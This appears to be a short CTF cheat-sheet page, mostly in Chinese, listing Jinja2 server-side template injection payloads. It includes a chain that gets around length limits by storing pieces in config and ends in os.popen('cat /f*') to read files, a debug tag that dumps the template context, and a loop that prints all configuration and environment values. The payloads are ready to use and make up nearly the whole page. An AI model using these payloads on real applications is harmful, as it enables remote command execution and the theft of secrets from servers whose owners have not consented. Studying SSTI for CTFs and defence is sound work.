---
title: "Jinja2 SSTI"
author: ["4shen0ne"]
tags: ["ssti", "ctf"]
draft: false
---

## 绕过长度限制 {#绕过长度限制}

```nil
{{config.update(c=config.update)}}
{{config.update(g="__globals__")}}
{{config.c(f=lipsum[config.g])}}
{{config.c(o=config.f.os)}}
{{config.c(p=config.o.popen)}}
{{config.p("cat /f*").read()}}
```


## 调试语句 {#调试语句}

如果启用了调试扩展，将会有一个 `debug` 标签可用于转储当前上下文以及可用的过滤器和
测试。

```html
<pre>
{% debug %}
</pre>
```


## 转储所有配置变量 {#转储所有配置变量}

```html
{{ config }} #In these object you can find all the configured env variables

{% for key, value in config.items() %}
<dt>{{ key|e }}</dt>
<dd>{{ value|e }}</dd>
{% endfor %}
```
